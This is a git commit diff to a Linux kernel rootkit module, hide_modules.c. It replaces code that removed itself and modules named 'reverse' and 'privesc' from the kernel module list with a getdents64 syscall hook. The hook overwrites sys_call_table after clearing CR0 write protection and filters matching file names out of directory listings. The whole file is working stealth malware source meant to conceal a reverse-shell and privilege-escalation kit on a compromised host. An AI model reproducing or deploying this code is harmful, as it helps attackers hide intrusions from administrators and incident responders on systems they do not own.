35a49aafff6b6c9d548395f18c46670ee130ee87
Nathan Guyard <nathan.arkanoxd12@gmail.com>
2024-12-15 07:46:37 -0800

    fix: hide path

--- module_rootkit/hide_modules.c
+++ module_rootkit/hide_modules.c
@@ -1,146 +1,117 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/list.h>
-#include <linux/string.h>
-#include <linux/sysfs.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
+#include <linux/syscalls.h>
+#include <linux/dirent.h>
+#include <linux/kallsyms.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nathan, FL");
-MODULE_DESCRIPTION("Stealthy Hide and Protect Multiple Modules");
-MODULE_VERSION("0.05");
+MODULE_DESCRIPTION("Stealthy Hide and Protect Multiple Modules and Files");
+MODULE_VERSION("0.06");
 
-static struct module *get_module(const char *module_name);
-static void hide_module(const char *module_name);
-static void show_module(const char *module_name);
-static void protect_module(struct module *mod);
-static void unprotect_module(struct module *mod);
-static void hide_self(void);
-static void show_self(void);
+#define TARGET_DIR "/lib/modules/6.10.10/"
+#define HIDE_PREFIXES_SIZE 3
 
-static struct list_head *prev_self;
-static short self_hidden = 0;
+static char *hide_prefixes[HIDE_PREFIXES_SIZE] = {
+    "privesc",
+    "hide_modules",
+    "reverse"
+};
 
-static struct module *get_module(const char *module_name)
+static asmlinkage long (*original_getdents64)(const struct pt_regs *);
+
+static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 {
-    struct module *mod;
+    int ret, bpos;
+    struct linux_dirent64 *current_dir, *previous_dir = NULL, *dirent_buffer;
+    struct fd f = fdget(regs->di);
+    char *kernel_buffer;
 
-    list_for_each_entry(mod, THIS_MODULE->list.prev, list) {
-        if (strcmp(mod->name, module_name) == 0) {
-            return mod;
-        }
+    if (!f.file || strcmp(f.file->f_path.dentry->d_name.name, TARGET_DIR) != 0) {
+        fdput(f);
+        return original_getdents64(regs);
     }
 
-    return NULL;
-}
-
-static void hide_module(const char *module_name)
-{
-    struct module *mod;
-
-    mod = get_module(module_name);
-    if (!mod) {
-        return;
+    kernel_buffer = kzalloc((size_t)regs->dx, GFP_KERNEL);
+    if (!kernel_buffer) {
+        fdput(f);
+        return -ENOMEM;
     }
 
-    list_del(&mod->list); 
-}
-
-static void show_module(const char *module_name)
-{
-    struct module *mod;
-
-    mod = get_module(module_name);
-    if (!mod) {
-        return;
+    ret = original_getdents64(regs);
+    if (ret <= 0) {
+        kfree(kernel_buffer);
+        fdput(f);
+        return ret;
     }
 
-    list_add(&mod->list, THIS_MODULE->list.prev); 
-}
+    dirent_buffer = (struct linux_dirent64 *)kernel_buffer;
+    copy_from_user(dirent_buffer, (void __user *)regs->si, (unsigned long)ret);
 
-static void protect_module(struct module *mod)
-{
-    if (!mod) {
-        return;
-    }
+    bpos = 0;
+    while (bpos < ret) {
+        current_dir = (struct linux_dirent64 *)((char *)dirent_buffer + bpos);
+        bool hide = false;
 
-    try_module_get(mod); 
-}
-
-static void unprotect_module(struct module *mod)
-{
-    if (!mod) {
-        return;
-    }
-
-    module_put(mod);
-}
-
-static void hide_self(void)
-{
-    if (!self_hidden) {
-        prev_self = THIS_MODULE->list.prev;
-        list_del(&THIS_MODULE->list); 
-        kobject_del(&THIS_MODULE->mkobj.kobj); 
-        THIS_MODULE->sect_attrs = NULL;       
-        self_hidden = 1;
-    }
-}
-
-static void show_self(void)
-{
-    int ret;
-
-    if (self_hidden) {
-        list_add(&THIS_MODULE->list, prev_self); 
-
-        ret = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "hide_modules");
-        if (ret < 0) {
-            return;
+        for (int i = 0; i < HIDE_PREFIXES_SIZE; i++) {
+            if (strncmp(current_dir->d_name, hide_prefixes[i], strlen(hide_prefixes[i])) == 0) {
+                hide = true;
+                break;
+            }
         }
 
-        self_hidden = 0;
+        if (hide) {
+            if (previous_dir)
+                previous_dir->d_reclen += current_dir->d_reclen;
+            else
+                ret -= current_dir->d_reclen;
+        } else {
+            previous_dir = current_dir;
+        }
+
+        bpos += current_dir->d_reclen;
     }
+
+    copy_to_user((void __user *)regs->si, dirent_buffer, ret);
+    kfree(kernel_buffer);
+    fdput(f);
+
+    return ret;
 }
 
 static int __init hide_modules_init(void)
 {
-    struct module *reverse, *privesc;
+    unsigned long address;
 
-    reverse = get_module("reverse");
-    privesc = get_module("privesc");
-
-    if (reverse) {
-        hide_module("reverse");
-        protect_module(reverse);
-    }
-    if (privesc) {
-        hide_module("privesc");
-        protect_module(privesc);
+    address = kallsyms_lookup_name("sys_call_table");
+    if (!address) {
+        return -1;
     }
 
-    hide_self();
+    original_getdents64 = ((void **)address)[__NR_getdents64];
+    write_cr0(read_cr0() & (~0x10000));
+    ((void **)address)[__NR_getdents64] = hooked_getdents64;
+    write_cr0(read_cr0() | 0x10000);
 
     return 0;
 }
 
 static void __exit hide_modules_exit(void)
 {
-    struct module *reverse, *privesc;
+    unsigned long address;
 
-    reverse = get_module("reverse");
-    privesc = get_module("privesc");
-
-    if (reverse) {
-        show_module("reverse");
-        unprotect_module(reverse);
-    }
-    if (privesc) {
-        show_module("privesc");
-        unprotect_module(privesc);
+    address = kallsyms_lookup_name("sys_call_table");
+    if (!address) {
+        return;
     }
 
-    show_self();
+    write_cr0(read_cr0() & (~0x10000));
+    ((void **)address)[__NR_getdents64] = original_getdents64;
+    write_cr0(read_cr0() | 0x10000);
 }
 
 module_init(hide_modules_init);
